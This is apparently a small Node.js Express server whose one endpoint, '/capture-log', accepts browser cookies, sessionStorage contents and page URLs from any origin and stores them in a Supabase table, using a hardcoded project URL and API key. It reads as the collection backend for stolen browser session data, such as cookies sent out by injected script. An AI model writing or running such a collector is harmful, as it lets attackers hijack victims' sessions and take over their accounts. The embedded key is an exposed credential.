import express from 'express';
import cors from 'cors';
import { createClient } from '@supabase/supabase-js';

const app = express();
app.use(cors());
app.use(express.json());

// మీ సుపాబేస్ వివరాలు ఇక్కడ ఇవ్వండి
const SUPABASE_URL = 'https://cxpandxwsqnxnmifljig.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN4cGFuZHh3c3FueG5taWZsamlnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODkyMzYzMzcsImV4cCI6MjEwNDgxMjMzN30.crX1PcwyZBWv6oOwdBMuIBUnAmkY-_RmlZM_aOsO9V8';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

app.post('/capture-log', async (req, res) => {
    const { cookies, sessionStorage, url } = req.body;

    const { data, error } = await supabase
        .from('web_logs')
        .insert([{
            cookies: cookies,
            session_storage: sessionStorage,
            url: url
        }]);

    if (error) {
        console.error("Supabase Error:", error);
        return res.status(500).json(error);
    }

    console.log("Data successfully synced to Supabase!");
    res.json({ status: "success" });
});

app.listen(5000, () => console.log('Server running on port 5000'));